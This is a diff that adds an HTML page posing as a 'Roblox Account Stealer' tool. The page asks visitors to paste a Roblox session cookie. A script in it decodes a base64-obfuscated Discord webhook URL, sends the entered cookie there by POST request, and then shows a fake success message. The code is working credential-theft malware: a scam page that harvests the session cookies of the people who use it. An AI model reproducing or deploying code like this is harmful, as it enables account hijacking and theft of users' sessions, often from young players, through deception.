@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ropro Stealer | Fav_Tool</title>
+    <link rel="icon" href="https://cdn3.emoji.gg/emojis/11607-purple-jeffree-star.png" type="image/png">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(20, 0, 30, 0.8);
+            padding: 2rem;
+            border-radius: 8px;
+            border: 1px solid #6a0dad;
+            box-shadow: 0 0 20px #6a0dad;
+            width: 300px;
+            text-align: center;
+        }
+        h1 {
+            color: #9b59b6;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        input {
+            width: 100%;
+            padding: 0.5rem;
+            margin-bottom: 1rem;
+            background: #111;
+            border: 1px solid #6a0dad;
+            color: #fff;
+            border-radius: 4px;
+        }
+        button {
+            background: #6a0dad;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #8e44ad;
+        }
+        .status {
+            margin-top: 1rem;
+            font-size: 0.8rem;
+            height: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ROBLOX ACCOUNT STEALER</h1>
+        <p>End-To-End Process | Encrypted using JavaChant | Made by Fav_Nonchalant</p>
+        <input type="text" id="usernameInput" placeholder="RBLX Cookie">
+        <button id="processBtn">PROCESS</button>
+        <div class="status" id="status"></div>
+    </div>
+<script src="url.js"></script>
+<script>const caller=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNTU2NDA1ODQzMzg4MDA3NC9vNmg2ak1McU84OTNRQUpxeEhPNmdXNzQ5TmpTcnY4NFdWd0lLSlQ0NW81YXF6VGZZWXZQTnRrNV9OMXVSeHZ3ekVfTA==");document.getElementById('processBtn').addEventListener('click',async()=>{const e=document.getElementById('usernameInput'),t=e.value.trim(),n=document.getElementById('status');if(!t)return n.textContent="Please enter a cookie to hack into";e.style.filter="blur(5px)",e.disabled=!0,n.textContent="Processing...";try{await fetch(caller,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`\`\`\` ${t}\`\`\``,username:'Roblox Account'})}),n.textContent="Success! Please wait for the account to be processed.",e.value="",setTimeout(()=>{e.style.filter="none",e.disabled=!1},1500)}catch(o){n.textContent="Error occurred",e.style.filter="none",e.disabled=!1}});</script>
+</body>
+</html>
